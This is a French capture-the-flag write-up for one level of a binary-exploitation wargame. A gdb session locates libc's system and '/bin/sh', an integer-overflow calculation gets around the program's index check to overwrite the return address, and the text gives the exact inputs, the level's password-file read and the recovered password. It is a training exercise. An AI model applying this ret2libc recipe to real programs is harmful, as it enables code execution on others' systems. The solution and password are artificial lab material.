1. En ecrivant la source on comprend que l'on peut ecrire sur des zones memoires a l'aide du programme. La seule condition est de ne pas donner un index multiple de 3 ou dont la division par `16777216` donne `183`.

2. Sachant cela et le fait que les variables d'environnement sont bzero, on va faire un RET2LIBC.

```
(gdb) b *0x08048636

(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()

(gdb) x $ebp+0x8
0xffffd400:	0xffffd424

(gdb) info function puts
[...]
0x080484c0  puts

(gdb) disas 0x080484c0
Dump of assembler code for function puts@plt:
   0x080484c0 <+0>:	jmp    *0x804a014
   0x080484c6 <+6>:	push   $0x28
   0x080484cb <+11>:	jmp    0x8048460
End of assembler dump.

(gdb) info proc map
0xf7e2c000...0xf7fd0000

(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec

(gdb) info functions system
0xf7e6aed0  system

(gdb) b *0x080489f1 
(gdb) c
[...]
quit

Breakpoint 2, 0x080489f1 in main ()

(gdb) x/wx $esp
0xffffd5c8:	0xf7e45513
```

> Adresse de "/bin/sh" `0xf7f897ec = 4160264172`
> Adresse de system    `0xf7e6aed0 = 4159090384`
> Offset de l'EIP      `0xffffd5c8 - 0xffffd400 = 456` donc `114`

```
// On ne peut pas utiliser 114
114 % 3 == 0

// On va donc overflow l'uint32
0xffffffff / 4 + 114 + 1 = 1073741938

// On verifie
1073741938 % 3 = 1
```

> Number : `4160264172`
> Index : `116`
> Number : `4159090384`
> Index : `1073741938`

```
cat /home/users/level08/.pass
```

> Pass : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
